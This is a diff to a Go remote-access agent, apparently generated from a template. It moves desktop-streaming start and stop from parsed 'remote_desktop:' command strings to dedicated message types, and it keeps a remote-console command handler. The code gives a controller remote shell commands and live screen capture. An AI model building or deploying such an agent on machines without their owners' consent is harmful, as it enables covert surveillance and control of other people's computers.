@@ -62,7 +62,6 @@ import (
     ""os""
     ""os/exec""
     ""os/signal""
-    ""strconv""
     ""strings""
     ""sync""
     ""syscall""
@@ -83,6 +82,8 @@ const (
     typePong = ""pong""
     typeCommand = ""command""
     typeDesktopFrame = ""frame""
+    typeDesktopStart = ""desktop_start""
+    typeDesktopStop = ""desktop_stop""
 )
 
 const securityMode = ""{mode}""
@@ -452,6 +453,14 @@ func handleInboundStream(ctx context.Context, stream *quic.ReceiveStream, writer
             }}
         }}
 
+        if msg.Channel == channelMain && msg.Type == typeDesktopStart {{
+            startDesktopStreaming(ctx, writer, msg.DesktopMonitor, msg.DesktopQuality)
+        }}
+
+        if msg.Channel == channelMain && msg.Type == typeDesktopStop {{
+            stopDesktopStreaming()
+        }}
+
         if msg.Channel == channelControl && msg.Type == typeCommand {{
             if strings.HasPrefix(msg.Command, ""remote_console:"") {{
                 command := strings.TrimPrefix(msg.Command, ""remote_console:"")
@@ -478,11 +487,6 @@ func handleInboundStream(ctx context.Context, stream *quic.ReceiveStream, writer
                         return err
                     }}
                 }}
-                continue
-            }}
-
-            if strings.HasPrefix(msg.Command, ""remote_desktop:"") {{
-                handleDesktopCommand(ctx, writer, msg.Command)
                 continue
             }}
 
@@ -636,34 +640,6 @@ type BITMAPINFOHEADER struct {{
 type BITMAPINFO struct {{
     Header BITMAPINFOHEADER
     Colors [1]uint32
-}}
-
-func handleDesktopCommand(ctx context.Context, writer *streamWriter, command string) {{
-    if command == ""remote_desktop:stop"" {{
-        stopDesktopStreaming()
-        return
-    }}
-
-    if !strings.HasPrefix(command, ""remote_desktop:start:"") {{
-        return
-    }}
-
-    parts := strings.SplitN(command, "":"", 4)
-    if len(parts) < 4 {{
-        return
-    }}
-
-    monitorIndex, err := strconv.Atoi(parts[2])
-    if err != nil {{
-        return
-    }}
-
-    quality, err := strconv.Atoi(parts[3])
-    if err != nil {{
-        return
-    }}
-
-    startDesktopStreaming(ctx, writer, monitorIndex, quality)
 }}
 
 func startDesktopStreaming(ctx context.Context, writer *streamWriter, monitorIndex, quality int) {{
